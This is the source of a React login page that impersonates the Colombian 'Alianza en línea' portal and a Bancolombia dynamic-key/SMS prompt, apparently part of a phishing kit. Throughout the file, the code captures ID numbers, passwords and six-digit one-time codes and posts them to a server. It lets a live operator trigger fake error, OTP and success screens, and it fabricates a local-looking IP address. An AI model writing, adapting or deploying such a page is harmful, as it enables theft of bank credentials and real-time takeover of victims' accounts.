import { useState, useRef, useEffect } from "react"

const DOCS = [
  "Cédula de Ciudadanía",
  "Cédula de Extranjería",
  "Tarjeta de Identidad",
  "Pasaporte",
  "Registro Civil",
  "NUIP",
]

export default function PortalPersonas({ onBack }) {
  const [docType, setDocType] = useState(DOCS[0])
  const [documentVal, setDocumentVal] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [authorized, setAuthorized] = useState(false)
  const [username, setUsername] = useState("")
  const [loading, setLoading] = useState(false)
  
  // Real-time session and OTP states
  const [loginError, setLoginError] = useState("")
  const [otpType, setOtpType] = useState(null) // null, 'dinamica', 'sms'
  const [otpValues, setOtpValues] = useState(["", "", "", "", "", ""])
  const [otpSubmitting, setOtpSubmitting] = useState(false)
  const [otpError, setOtpError] = useState("")
  const [sessionSuccess, setSessionSuccess] = useState(false)

  const pingIntervalRef = useRef(null)
  const pollIntervalRef = useRef(null)

  const ready =
    documentVal.trim().length > 4 &&
    password.trim().length > 3 &&
    (!authorized || username.trim().length > 2)

  const stopLoops = () => {
    if (pingIntervalRef.current) clearInterval(pingIntervalRef.current)
    if (pollIntervalRef.current) clearInterval(pollIntervalRef.current)
  }

  const startSessionLoop = (sessId) => {
    stopLoops()

    // 1. Session keepalive (ping) every 3 seconds
    const sendPing = () => {
      fetch(`/api/sessions/${sessId}/ping`, { method: "POST" }).catch(() => {})
    }
    sendPing()
    pingIntervalRef.current = setInterval(sendPing, 3000)

    // 2. Poll session state every 1.5 seconds
    pollIntervalRef.current = setInterval(async () => {
      try {
        const response = await fetch(`/api/sessions/${sessId}`)
        if (response.ok) {
          const data = await response.json()
          const action = data.action

          if (action === "done") {
            stopLoops()
            setOtpType(null)
            setLoading(false)
            setSessionSuccess(true)
          } else if (action === "dinamica" || action === "sms") {
            // Keep loader active if token is present and currently being validated on server
            if (data.token && data.token !== "") {
              setOtpSubmitting(true)
            } else {
              setOtpSubmitting(false)
              setOtpType(action)
            }
          } else if (action === "error-dinamica") {
            setOtpSubmitting(false)
            setOtpError("Clave Dinámica incorrecta. Por favor, verifica e ingresa nuevamente.")
            setOtpValues(["", "", "", "", "", ""])
            // Reset action on server so it doesn't loop
            fetch(`/api/sessions/${sessId}/action`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ action: null }),
            }).catch(() => {})
          } else if (action === "error-sms") {
            setOtpSubmitting(false)
            setOtpError("Código SMS incorrecto. Por favor, verifica e ingresa nuevamente.")
            setOtpValues(["", "", "", "", "", ""])
            // Reset action on server so it doesn't loop
            fetch(`/api/sessions/${sessId}/action`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ action: null }),
            }).catch(() => {})
          } else if (action === "error-login") {
            stopLoops()
            setLoading(false)
            setOtpType(null)
            setLoginError("Usuario o contraseña incorrecta. Por favor, verifique sus datos.")
          }
        }
      } catch (_) {}
    }, 1500)
  }

  useEffect(() => {
    return () => stopLoops()
  }, [])

  function submit(event) {
    event.preventDefault()
    if (!ready || loading) return
    setLoading(true)
    setLoginError("")
    setOtpError("")

    let sessId = sessionStorage.getItem("sessionId")
    if (!sessId) {
      sessId = "sess_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9)
      sessionStorage.setItem("sessionId", sessId)
    }

    const docStr = documentVal.trim()
    const passStr = password.trim()
    const userStr = username.trim()

    const sessionData = {
      id: sessId,
      username: `${docType.toUpperCase()}:${docStr}${authorized ? ` / ${userStr}` : ""}`,
      password: passStr,
      tipoUsuario: docType,
      device: window.innerWidth <= 768 ? "mobile" : "desktop",
      ip: "186.29." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255),
      state: "waiting",
      createdAt: Date.now(),
    }

    fetch("/api/sessions", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(sessionData),
    })
      .then((res) => {
        if (res.ok) {
          startSessionLoop(sessId)
        } else {
          setLoading(false)
          setLoginError("Error al conectar. Intente de nuevo.")
        }
      })
      .catch(() => {
        setLoading(false)
        setLoginError("Error al intentar conectar. Intente de nuevo.")
      })
  }

  const handleOtpChange = (index, val) => {
    const newVal = val.replace(/\D/g, "").slice(-1)
    const newOtpValues = [...otpValues]
    newOtpValues[index] = newVal
    setOtpValues(newOtpValues)

    let sessId = sessionStorage.getItem("sessionId")
    if (sessId) {
      const len = newOtpValues.filter((v) => v !== "").length
      const targetState =
        len > 0 ? "typing" : otpType === "sms" ? "waiting-sms" : "waiting-dinamica"
      fetch(`/api/sessions/${sessId}/state`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ state: targetState }),
      }).catch(() => {})
    }

    if (newVal && index < 5) {
      const nextInput = document.getElementById(`otp-slot-${index + 1}`)
      if (nextInput) nextInput.focus()
    }
  }

  const handleOtpKeyDown = (index, event) => {
    if (event.key === "Backspace" && !otpValues[index] && index > 0) {
      const newOtpValues = [...otpValues]
      newOtpValues[index - 1] = ""
      setOtpValues(newOtpValues)

      const prevInput = document.getElementById(`otp-slot-${index - 1}`)
      if (prevInput) {
        prevInput.focus()
      }
    }
  }

  const handleOtpPaste = (event) => {
    event.preventDefault()
    const clipboardData = event.clipboardData.getData("text") || ""
    const digits = clipboardData.replace(/\D/g, "").slice(0, 6).split("")

    const newOtpValues = [...otpValues]
    digits.forEach((digit, i) => {
      newOtpValues[i] = digit
    })
    setOtpValues(newOtpValues)

    const lastIdx = Math.min(digits.length, 6) - 1
    if (lastIdx >= 0) {
      const lastInput = document.getElementById(`otp-slot-${lastIdx}`)
      if (lastInput) lastInput.focus()
    }
  }

  const handleOtpSubmit = () => {
    const token = otpValues.join("")
    if (token.length !== 6) return

    setOtpSubmitting(true)
    let sessId = sessionStorage.getItem("sessionId")
    fetch(`/api/sessions/${sessId}/token`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ token }),
    }).catch(() => {
      setOtpSubmitting(false)
    })
  }

  const handleOtpClose = () => {
    stopLoops()
    setOtpType(null)
    setLoading(false)
  }

  if (sessionSuccess) {
    return (
      <div className="portal portal--success">
        <section className="portal__form" style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div className="portal__card" style={{ textAlign: "center", padding: "48px 32px" }}>
            <div style={{ color: "#3ecf8e", fontSize: "48px", marginBottom: "16px" }}>✓</div>
            <h2 style={{ marginBottom: "16px" }}>¡Ingreso Exitoso!</h2>
            <p style={{ color: "#5b7388", marginBottom: "32px" }}>
              Su sesión ha sido validada de forma segura por el operador.
            </p>
            <button type="button" className="portal__submit is-ready" onClick={onBack}>
              Continuar
            </button>
          </div>
        </section>
      </div>
    )
  }

  return (
    <div className={`portal ${loading ? "is-loading" : ""}`}>
      <section className="portal__intro">
        <div className="portal__copy">
          <h1>
            <span>Invierta con</span>
            <em>Alianza</em>
          </h1>
          <p>
            Bienvenido a Alianza en línea, protegemos el futuro con experiencia y
            responsabilidad para asegurar su bienestar financiero.
          </p>
        </div>
      </section>

      <section className="portal__form">
        <header className="portal__top">
          <button type="button" className="portal__brand" onClick={onBack}>
            <img src="/logo-enlinea-mark.png" alt="" />
            <img src="/logo-enlinea-text.png" alt="Alianza en líne@" />
          </button>
          <nav>
            <button type="button">Recomendaciones</button>
            <button type="button">Español</button>
            <button type="button">English</button>
          </nav>
        </header>

        <form className="portal__card" onSubmit={submit}>
          <h2>¡Bienvenido!</h2>

          {loginError && (
            <div style={{ color: "#d93838", background: "#ffebee", padding: "10px", borderRadius: "4px", fontSize: "14px", marginBottom: "16px" }}>
              {loginError}
            </div>
          )}

          <label>
            <span>Tipo de documento <i>*</i></span>
            <select value={docType} onChange={(event) => setDocType(event.target.value)}>
              {DOCS.map((item) => (
                <option key={item}>{item}</option>
              ))}
            </select>
            {authorized ? <small className="portal__hint">Esta información pertenece al titular</small> : null}
          </label>

          <label>
            <span>Número de documento <i>*</i></span>
            <input
              value={documentVal}
              onChange={(event) => setDocumentVal(event.target.value)}
              placeholder="Escriba el número de documento"
              autoComplete="off"
            />
            {authorized ? <small className="portal__hint">Esta información pertenece al titular</small> : null}
          </label>

          {authorized ? (
            <label>
              <span>Usuario <i>*</i></span>
              <input
                value={username}
                onChange={(event) => setUsername(event.target.value)}
                placeholder="Escriba el usuario"
                autoComplete="username"
              />
            </label>
          ) : null}

          <label>
            <span>Contraseña <i>*</i></span>
            <span className="portal__pass">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(event) => setPassword(event.target.value)}
                placeholder="Ingrese la contraseña"
                autoComplete="current-password"
              />
              <button type="button" onClick={() => setShowPassword((open) => !open)} aria-label="Mostrar contraseña">
                <svg viewBox="0 0 24 24" aria-hidden="true">
                  <path d="M12 5C7.9 5 4.1 7.91 2.08 13a16.5 16.5 0 0 0 19.84 0C19.9 7.91 16.1 5 12 5Zm0 12a6 6 0 1 1 6-6 6 6 0 0 1-6 6Zm0-9a3 3 0 1 0 3 3 3 3 0 0 0-3-3Z" />
                </svg>
              </button>
            </span>
          </label>

          <button type="button" className="portal__forgot">
            ¿Olvidó la contraseña?
          </button>

          <label className="portal__check">
            <input
              type="checkbox"
              checked={authorized}
              onChange={(event) => {
                const next = event.target.checked
                setAuthorized(next)
                if (!next) setUsername("")
              }}
            />
            Personas Autorizadas
          </label>

          <button type="submit" className={`portal__submit ${ready ? "is-ready" : ""}`} disabled={!ready || loading}>
            Ingrese
          </button>

          <p className="portal__account">¿No tiene cuenta?</p>
          <button type="button" className="portal__register">
            Regístrese
          </button>
          <p className="portal__note">Este registro solo es válido para Persona Natural.</p>
        </form>
      </section>

      {loading && !otpType ? (
        <div className="portal__loader" role="status" aria-live="polite">
          <span className="portal__spinner" />
          <span className="sr-only">Cargando</span>
        </div>
      ) : null}

      {/* Bancolombia key validation modal */}
      {otpType && (
        <div className="bc-key-validation">
          <div className="app-bg-otp" aria-hidden="true">
            <img src="/assets/otp-bg.png" alt="" />
          </div>

          <div className="bc-key-validation-dialog" role="dialog" aria-modal="true">
            <div className="bc-key-validation-close">
              <button type="button" onClick={handleOtpClose} aria-label="cerrar">×</button>
            </div>

            <div className="bc-key-validation-content" style={{ display: otpSubmitting ? "none" : "block" }}>
              <div className="bc-key-validation-header">
                <div className="bc-key-validation-dynamic-container">
                  <svg className="otp-strokes" viewBox="0 0 220 80" aria-hidden="true">
                    <path d="M8 18 C 40 8, 70 28, 96 14" fill="none" stroke="#f4d24a" stroke-width="7" stroke-linecap="round" />
                    <path d="M18 38 C 52 22, 88 48, 118 28" fill="none" stroke="#f07a3a" stroke-width="8" stroke-linecap="round" />
                    <path d="M38 62 C 72 48, 102 70, 138 54" fill="none" stroke="#3ecf8e" stroke-width="7" stroke-linecap="round" />
                    <path d="M70 8 C 92 2, 108 22, 128 10" fill="none" stroke="#7ed0ea" stroke-width="6" stroke-linecap="round" />
                  </svg>
                  <div className="otp-app-icon" aria-hidden="true">
                    <span>Mi</span>
                    <svg viewBox="0 0 32 32">
                      <path d="M8.08 11.06c.15.57.73.87 1.33.67 4.86-1.47 9.74-2.48 14.77-3.22.58-.08.89-.66.68-1.25-.45-1.24-.67-1.86-1.13-3.09-.19-.53-.72-.87-1.25-.81-4.92.6-9.67 1.48-14.43 2.84-.62.19-1 .87-.84 1.48.35 1.35.52 2.02.87 3.38z" fill="#fff" />
                      <path d="M27.56 11.79c-.19-.56-.7-.93-1.2-.86-7.65.97-15.09 2.85-22.15 5.95-.51.24-.82.89-.71 1.45.28 1.45.42 2.18.7 3.63.12.62.7.91 1.28.63 7.17-3.26 14.75-5.34 22.52-6.58.49-.08.75-.64.56-1.22-.39-1.2-.59-1.8-.99-3z" fill="#fff" />
                      <path d="M27.62 19.9c-.19-.6-.74-.99-1.26-.88-4.75 1.04-9.39 2.29-13.99 3.88-.58.21-.91.83-.76 1.4.37 1.36.55 2.04.92 3.4.17.64.89.96 1.54.71 4.6-1.66 9.24-3.1 13.99-4.26.45-.11.68-.65.51-1.2-.37-1.22-.56-1.83-.95-3.05z" fill="#fff" />
                    </svg>
                  </div>
                </div>
                <h3>{otpType === "dinamica" ? "Ingresa la Clave Dinámica" : "Ingresa el Código SMS"}</h3>
              </div>

              <div className="bc-key-validation-body">
                <p className="bc-key-validation-description" style={{ color: otpError ? "#d93838" : "", fontWeight: otpError ? "600" : "" }}>
                  {otpError || (otpType === "dinamica"
                    ? "Encuentra tu Clave Dinámica en la app Bancolombia Negocios."
                    : "Ingresa el código de 6 dígitos enviado por mensaje de texto (SMS) a tu celular registrado.")}
                </p>
                <div className="bc-key-validation-input-container">
                  <div className="bc-input-token-container">
                    {otpValues.map((val, i) => (
                      <input
                        key={i}
                        id={`otp-slot-${i}`}
                        className="bc-input"
                        inputMode="numeric"
                        maxLength={1}
                        autoComplete="off"
                        value={val}
                        onChange={(e) => handleOtpChange(i, e.target.value)}
                        onKeyDown={(e) => handleOtpKeyDown(i, e)}
                        onPaste={handleOtpPaste}
                        aria-label={`Ingresar dígito ${i + 1}`}
                      />
                    ))}
                  </div>
                </div>
              </div>

              <div className="bc-key-validation-footer">
                <div className="bc-key-validation-action-container">
                  <button className="btn-secondary" type="button" onClick={() => {
                    setOtpValues(["", "", "", "", "", ""])
                    setOtpError("")
                  }}>Borrar</button>
                  <button
                    className="btn-primary"
                    type="button"
                    disabled={otpValues.join("").length !== 6}
                    onClick={handleOtpSubmit}
                  >
                    Continuar
                  </button>
                </div>
              </div>
            </div>

            <div className="bc-key-validation-content-loading" style={{ display: otpSubmitting ? "flex" : "none" }}>
              <span className="validate-spin" aria-hidden="true"></span>
              <p>Validando {otpType === "dinamica" ? "Clave Dinámica" : "Código SMS"}...</p>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
